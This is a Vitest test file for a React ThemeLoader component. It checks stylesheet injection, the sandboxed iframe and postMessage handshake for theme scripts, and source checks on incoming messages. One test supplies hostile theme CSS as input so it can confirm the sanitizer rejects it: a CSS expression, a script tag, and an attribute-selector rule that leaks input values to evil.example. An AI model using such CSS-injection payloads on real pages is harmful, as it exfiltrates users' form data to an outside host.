import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { render, waitFor, act } from "@testing-library/react";
import { ThemeLoader } from "./ThemeLoader";

// --- hoisted mock state ---
const { mockPluginId, mockAccessToken } = vi.hoisted(() => ({
  mockPluginId: { value: null as string | null },
  mockAccessToken: { value: null as string | null },
}));

vi.mock("@evey/store", () => ({
  useThemeStore: (sel?: (s: Record<string, unknown>) => unknown) => {
    const state = { pluginId: mockPluginId.value };
    if (sel) return sel(state);
    return state;
  },
  // useAuthStore is used both as a hook (sel) AND via .getState() inside the
  // effect body (to avoid token rotation triggering a re-init). Both paths must
  // use the same mutable mockAccessToken reference.
  useAuthStore: Object.assign(
    (sel: (s: Record<string, unknown>) => unknown) =>
      sel({ accessToken: mockAccessToken.value }),
    { getState: () => ({ accessToken: mockAccessToken.value }) },
  ),
}));

// Capture eveyFetchRaw calls
const eveyFetchRawMock = vi.fn();
vi.mock("@evey/api", () => ({
  eveyFetchRaw: (...args: unknown[]) => eveyFetchRawMock(...args),
}));

// Mock theme-bridge to keep BRIDGE_SCRIPT short in tests
vi.mock("./theme-bridge", () => ({
  THEME_BRIDGE_SCRIPT: "/* bridge */",
}));

function makeOkResponse() {
  return Promise.resolve({
    ok: true,
    status: 200,
    text: async () => "// theme js",
  });
}

function make404Rejection() {
  const err = Object.assign(new Error("not found"), { httpStatus: 404 });
  return Promise.reject(err);
}

beforeEach(() => {
  vi.clearAllMocks();
  mockPluginId.value = null;
  mockAccessToken.value = null;
  // Clean up any injected DOM artefacts from previous test
  document.querySelectorAll("[id^='evey-theme-']").forEach((el) => el.remove());
});

afterEach(() => {
  document.querySelectorAll("[id^='evey-theme-']").forEach((el) => el.remove());
});

describe("ThemeLoader", () => {
  it("renders null and injects nothing when no pluginId", () => {
    mockPluginId.value = null;
    const { container } = render(<ThemeLoader />);
    expect(container.innerHTML).toBe("");
    expect(document.querySelector("[id^='evey-theme-css-']")).toBeNull();
  });

  it("injects theme.css <link> when pluginId is set", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = "TOKEN";
    // theme.js returns 404 (CSS-only theme)
    eveyFetchRawMock.mockImplementation(make404Rejection);

    render(<ThemeLoader />);

    await waitFor(() => {
      const link = document.getElementById("evey-theme-css-dark");
      expect(link).not.toBeNull();
      expect((link as HTMLLinkElement).href).toContain("/api/v1/themes/dark/theme.css");
    });
  });

  it("does not inject iframe when theme.js returns 404", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = "TOKEN";
    eveyFetchRawMock.mockImplementation(make404Rejection);

    render(<ThemeLoader />);

    await waitFor(() => {
      expect(document.getElementById("evey-theme-css-dark")).not.toBeNull();
    });

    // Wait a bit to ensure the async flow completes
    await act(async () => {
      await new Promise((r) => setTimeout(r, 50));
    });

    expect(document.getElementById("evey-theme-iframe-dark")).toBeNull();
  });

  it("injects hidden sandbox iframe when theme.js exists (200 OK)", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = "TOKEN";
    eveyFetchRawMock.mockImplementation(makeOkResponse);

    render(<ThemeLoader />);

    await waitFor(() => {
      const iframe = document.getElementById("evey-theme-iframe-dark");
      expect(iframe).not.toBeNull();
    });
  });

  it("iframe has sandbox=allow-scripts attribute", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = "TOKEN";
    eveyFetchRawMock.mockImplementation(makeOkResponse);

    render(<ThemeLoader />);

    await waitFor(() => {
      const iframe = document.getElementById("evey-theme-iframe-dark") as HTMLIFrameElement | null;
      expect(iframe).not.toBeNull();
      expect(iframe!.getAttribute("sandbox")).toBe("allow-scripts");
    });
  });

  // theme.js runs in the served frame page (its own CSP, connect-src 'none'
  // for a theme), handed over after the handshake: the app's policy needs no
  // 'unsafe-inline' and no token rides in a URL. Before, a <script src> in a
  // srcdoc loaded theme.js from an opaque origin, without the token the route
  // requires.
  it("frames the served page with no network and hands it the bridge then theme.js", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = "TOKEN";
    eveyFetchRawMock.mockImplementation(makeOkResponse);

    render(<ThemeLoader />);

    let iframe: HTMLIFrameElement | null = null;
    await waitFor(() => {
      iframe = document.getElementById("evey-theme-iframe-dark") as HTMLIFrameElement | null;
      expect(iframe).not.toBeNull();
    });
    expect(iframe!.getAttribute("srcdoc")).toBeNull();
    expect(iframe!.getAttribute("src")).toBe("/plugin-frame.html");

    // happy-dom 21 leaves contentWindow null for a frame whose page it never
    // loads: a stand-in plays the frame's window the handshake is checked against.
    const frameWindow = { postMessage: () => {} } as unknown as Window;
    Object.defineProperty(iframe!, "contentWindow", { configurable: true, value: frameWindow });
    const post = vi.spyOn(frameWindow, "postMessage");
    act(() => {
      window.dispatchEvent(new MessageEvent("message", { data: { type: "evey-frame-shell" }, source: frameWindow }));
    });
    expect(post).toHaveBeenCalledWith({ type: "evey-frame-load", scripts: ["/* bridge */", "// theme js"] }, "*");

    // A handshake from any other window gets nothing.
    post.mockClear();
    act(() => {
      window.dispatchEvent(new MessageEvent("message", { data: { type: "evey-frame-shell" }, source: window }));
    });
    expect(post).not.toHaveBeenCalled();
  });

  it("does not inject iframe when no access token", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = null; // not authenticated
    eveyFetchRawMock.mockImplementation(makeOkResponse);

    render(<ThemeLoader />);

    await act(async () => {
      await new Promise((r) => setTimeout(r, 50));
    });

    // CSS link may or may not be there - but no iframe
    expect(document.getElementById("evey-theme-iframe-dark")).toBeNull();
    // fetch should not have been called
    expect(eveyFetchRawMock).not.toHaveBeenCalled();
  });

  it("token rotation does NOT re-initialise theme assets", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = "token-v1";
    eveyFetchRawMock.mockImplementation(make404Rejection);

    const { rerender } = render(<ThemeLoader />);

    await waitFor(() => {
      expect(eveyFetchRawMock).toHaveBeenCalledTimes(1);
      expect(document.getElementById("evey-theme-css-dark")).not.toBeNull();
    });

    // Simulate a silent token rotation: same pluginId, new token value.
    mockAccessToken.value = "token-v2";
    rerender(<ThemeLoader />);

    await act(async () => {
      await new Promise((r) => setTimeout(r, 50));
    });

    // The effect must NOT have re-run: eveyFetchRaw still called exactly once
    // and the CSS link must still be present (not torn down and re-injected).
    expect(eveyFetchRawMock).toHaveBeenCalledTimes(1);
    expect(document.getElementById("evey-theme-css-dark")).not.toBeNull();
  });

  it("cleans up assets when pluginId changes to null", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = "TOKEN";
    eveyFetchRawMock.mockImplementation(makeOkResponse);

    const { rerender } = render(<ThemeLoader />);

    await waitFor(() => {
      expect(document.getElementById("evey-theme-css-dark")).not.toBeNull();
    });

    // Simulate theme deactivation
    mockPluginId.value = null;
    rerender(<ThemeLoader />);

    await waitFor(() => {
      expect(document.getElementById("evey-theme-css-dark")).toBeNull();
    });
  });
});

describe("ThemeLoader postMessage handling", () => {
  it("theme.css message injects a <style> element into <head>", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = "TOKEN";
    eveyFetchRawMock.mockImplementation(makeOkResponse);

    // Spy on useThemeStore.getState for the message handler
    const { useThemeStore } = await import("@evey/store");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    (useThemeStore as any).getState = () => ({ pluginId: "dark" });

    render(<ThemeLoader />);

    await waitFor(() => {
      expect(document.getElementById("evey-theme-iframe-dark")).not.toBeNull();
    });

    // Simulate a postMessage from the iframe - jsdom doesn't actually run
    // iframe JS so we dispatch the message from "null" source to test the handler.
    // The handler guards on e.source === iframe.contentWindow; in jsdom the
    // iframe contentWindow is available but can't be matched to a MessageEvent
    // source easily. We dispatch on window directly and skip source check
    // by patching the iframeRef via the behaviour we can observe.
    // Instead, exercise the CSS sanitization path directly.
    const styleId = "evey-theme-injected-dark";
    expect(document.getElementById(styleId)).toBeNull();

    // Directly dispatch a message that looks like it comes from the iframe window.
    // In jsdom, contentWindow of a dynamically created iframe is accessible.
    const iframe = document.getElementById("evey-theme-iframe-dark") as HTMLIFrameElement;
    const fakeSource = iframe.contentWindow;

    act(() => {
      const ev = new MessageEvent("message", {
        data: { type: "theme.css", rules: "--accent: red; --radius: 8px" },
        source: fakeSource as Window,
      });
      window.dispatchEvent(ev);
    });

    await waitFor(() => {
      const style = document.getElementById(styleId);
      expect(style).not.toBeNull();
      expect(style!.textContent).toBe(":root{--accent:red;--radius:8px}");
    });
  });

  it("theme.css injects nothing when no declaration survives the policy", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = "TOKEN";
    eveyFetchRawMock.mockImplementation(makeOkResponse);

    const { useThemeStore } = await import("@evey/store");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    (useThemeStore as any).getState = () => ({ pluginId: "dark" });

    render(<ThemeLoader />);

    await waitFor(() => {
      expect(document.getElementById("evey-theme-iframe-dark")).not.toBeNull();
    });

    const iframe = document.getElementById("evey-theme-iframe-dark") as HTMLIFrameElement;
    const fakeSource = iframe.contentWindow;

    act(() => {
      window.dispatchEvent(
        new MessageEvent("message", {
          data: {
            type: "theme.css",
            rules:
              "body { background: expression(alert(1)); } <script>evil()</script>" +
              `input[value^="a"]{background:url("https://evil.example/leak")}`,
          },
          source: fakeSource as Window,
        }),
      );
    });

    // Nothing is filtered out of a rule any more - a payload that is not a
    // custom property declaration produces no <style> at all.
    await new Promise((r) => setTimeout(r, 20));
    expect(document.getElementById("evey-theme-injected-dark")).toBeNull();
  });

  it("ignores postMessage from unknown source", async () => {
    mockPluginId.value = "dark";
    mockAccessToken.value = "TOKEN";
    eveyFetchRawMock.mockImplementation(makeOkResponse);

    const { useThemeStore } = await import("@evey/store");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    (useThemeStore as any).getState = () => ({ pluginId: "dark" });

    render(<ThemeLoader />);

    await waitFor(() => {
      expect(document.getElementById("evey-theme-iframe-dark")).not.toBeNull();
    });

    // Dispatch from a null source (different from iframe.contentWindow)
    act(() => {
      window.dispatchEvent(
        new MessageEvent("message", {
          data: { type: "theme.css", rules: "body { color: blue; }" },
          source: null,
        }),
      );
    });

    // Style should NOT be injected since source doesn't match
    await act(async () => {
      await new Promise((r) => setTimeout(r, 30));
    });
    expect(document.getElementById("evey-theme-injected-dark")).toBeNull();
  });
});
